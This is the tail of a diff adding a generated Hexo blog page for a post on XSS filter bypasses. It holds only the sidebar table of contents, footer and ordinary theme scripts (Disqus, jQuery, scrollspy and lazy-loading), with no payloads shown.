+            
+          
+        </div>
+
+        <div class="links-of-friendly motion-element">
+          
+            <p class="site-author-name">Links</p>
+            
+              <span class="links-of-author-item">
+              <a href="http://idhyt.sinaapp.com/dragwall/" target="_blank">messages</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#几种弹窗绕过"><span class="nav-number">1.</span> <span class="nav-text">几种弹窗绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss中最经常用到的编码"><span class="nav-number">2.</span> <span class="nav-text">xss中最经常用到的编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一些绕过方法"><span class="nav-number">3.</span> <span class="nav-text">一些绕过方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chrome如何搜索关键字"><span class="nav-number">4.</span> <span class="nav-text">chrome如何搜索关键字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#插入漏洞方式"><span class="nav-number">5.</span> <span class="nav-text">插入漏洞方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM_xss特点"><span class="nav-number">6.</span> <span class="nav-text">DOM xss特点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#11个免费的Web安全测试工具"><span class="nav-number">7.</span> <span class="nav-text">11个免费的Web安全测试工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">8.</span> <span class="nav-text">其他</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp;  2011 - 
+  <span itemprop="copyrightYear">2015</span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">idhyt</span>
+
+  <div class="powered-by"></div>
+  <div class="powered-by">
+    Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+  </div>
+
+</div>
+
+<!--
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+<!--
+<div class="powered-by"></div>
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+-->
+
+<!--
+<div class="theme-info">
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次
+    </span>
+</div>
+-->
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+    
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'idhyt';
+      var disqus_identifier = '2014/10/15/technic-xss-bypass/';
+      var disqus_title = 'xss bypass';
+      var disqus_url = 'http://blog.idhyt.com/2014/10/15/technic-xss-bypass/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
